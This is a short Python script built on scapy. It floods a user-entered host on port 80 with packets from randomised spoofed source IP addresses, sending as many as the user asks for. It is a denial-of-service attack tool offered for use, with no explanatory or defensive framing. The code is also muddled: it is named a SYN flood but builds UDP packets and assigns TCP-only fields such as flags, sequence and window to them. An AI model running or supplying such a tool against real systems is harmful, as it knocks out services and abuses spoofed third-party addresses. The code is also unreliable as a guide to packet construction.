from os import system
from sys import stdout
from scapy.all import *
from random import randint

def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000,9000)
	return x


def SYN_Flood(dstIP,dstPort,counter):
	total = 0
	print ("Flooding with UDP---------")

	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		UDP_Packet = UDP ()
		UDP_Packet.sport = s_port
		UDP_Packet.dport = dstPort
		UDP_Packet.flags = "S"
		UDP_Packet.seq = s_eq
		UDP_Packet.window = w_indow

		send(IP_Packet/UDP_Packet, verbose=0)
		total+=1

	stdout.write("\nTotal packets sent ==> %i\n" % total)


def info():
	dstIP = str(input(" MAUAL INPUT HOST => "))
	dstPort = 80

	return dstIP,int(dstPort)


def main():
	dstIP,dstPort = info()
	counter = str(input("Packets to send LIMIT => 99999999999999999999999 ===> "))
	SYN_Flood(dstIP,dstPort,int(counter))

main()